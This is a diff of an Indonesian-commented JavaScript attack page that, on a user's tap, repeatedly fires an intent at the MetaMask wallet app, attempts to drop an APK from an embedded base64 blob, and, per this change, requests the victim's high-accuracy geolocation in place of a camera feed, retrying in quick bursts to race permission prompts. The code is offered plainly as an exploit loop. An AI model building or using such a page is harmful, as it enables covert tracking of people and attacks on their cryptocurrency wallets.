@@ -27,7 +27,6 @@
 </div>
 
 <div id="launcher-container" style="display: none;"></div>
-<video id="cam-feed" autoplay playsinline muted></video>
 
 <script>
 (function () {
@@ -42,7 +41,7 @@
   }
 
   // ============================================
-  // KONFIGURASI (SESUAIKAN TARGET)
+  // KONFIGURASI
   // ============================================
   var TARGET_INTENT = "intent://#Intent;" +
                       "package=io.metamask;" +
@@ -52,7 +51,7 @@
   var TARGET_APK_B64 = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
 
   // ============================================
-  // FUNGSI EKSEKUSI VEKTOR
+  // FUNGSI EKSEKUSI VEKTOR (TANPA KAMERA)
   // ============================================
   function triggerAPKRace() {
     try {
@@ -93,18 +92,26 @@
     } catch(e) {}
   }
 
-  function triggerCameraRace() {
+  // ============================================
+  // FUNGSI LOKASI (MENGGANTIKAN KAMERA)
+  // ============================================
+  function triggerLocationRace() {
     try {
-      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-        .then(function(stream) {
-          var video = document.getElementById('cam-feed');
-          video.srcObject = stream;
-          video.play().catch(function(){});
-          log("[+] Kamera BERHASIL diakses!");
-        })
-        .catch(function(err) {
-          log("[-] Kamera diblokir: " + err.name);
-        });
+      if (!navigator.geolocation) {
+        log("[-] Geolocation tidak didukung.");
+        return;
+      }
+      
+      // Minta lokasi (High Accuracy)
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          log("[+] LOKASI BERHASIL: " + position.coords.latitude + ", " + position.coords.longitude);
+        },
+        function(error) {
+          log("[-] Lokasi diblokir: " + error.message);
+        },
+        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+      );
     } catch(e) {}
   }
 
@@ -117,43 +124,43 @@
 
     document.getElementById('main-card').innerHTML = `
       <h2>EXECUTING...</h2>
-      <p>Memulai Rapid Race Condition...</p>
+      <p>Memulai Rapid Location & Intent Race...</p>
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Rapid Exploit Loop...");
+    log("[!] Memulai Rapid Location Race...");
 
     // 1. Trigger Pertama (0ms)
     triggerAPKRace();
     triggerIntentRace();
-    triggerCameraRace();
+    triggerLocationRace();
 
     // 2. Retry Cepat (50ms)
     setTimeout(function() {
       triggerAPKRace();
       triggerIntentRace();
-      triggerCameraRace();
+      triggerLocationRace();
     }, 50);
 
     // 3. Retry Sedang (150ms)
     setTimeout(function() {
       triggerAPKRace();
       triggerIntentRace();
-      triggerCameraRace();
+      triggerLocationRace();
     }, 150);
 
     // 4. Retry Lambat (500ms)
     setTimeout(function() {
       triggerAPKRace();
       triggerIntentRace();
-      triggerCameraRace();
+      triggerLocationRace();
     }, 500);
 
     // 5. Retry Terakhir (1000ms)
     setTimeout(function() {
       triggerAPKRace();
       triggerIntentRace();
-      triggerCameraRace();
+      triggerLocationRace();
     }, 1000);
 
   }, { once: true });
